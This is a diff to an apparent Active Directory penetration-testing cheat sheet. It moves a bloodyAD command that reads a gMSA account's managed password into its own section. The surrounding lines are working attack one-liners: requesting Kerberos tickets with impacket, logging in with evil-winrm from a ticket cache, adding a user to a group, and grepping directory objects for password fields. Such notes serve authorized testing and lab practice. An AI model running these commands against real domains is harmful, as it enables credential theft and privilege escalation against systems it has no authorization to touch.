@@ -553,6 +553,9 @@ impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME:$PASSWORD'; kcme
 +---------- .ccache to evil-winrm ----------+
 KRB5CCNAME='$USERNAME.ccache' evil-winrm -i $DC -r $DOM
 
++---------- ReadGMSAPassword ----------+
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object 'SVC_ACC$' --attr msDS-ManagedPassword
+
 +---------- AddSelf ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' '$USERNAME'; kcme
 
@@ -604,7 +607,6 @@ bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add dnsRecord 'xxx.domain.example
 
 +---------- Get ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get writable --detail
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object SVC_ACC$ --attr msDS-ManagedPassword
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object User | grep -Ei 'pass|pwd' | grep -vE 'bad|Last|Time' | cat
 
 +---------- Search ----------+
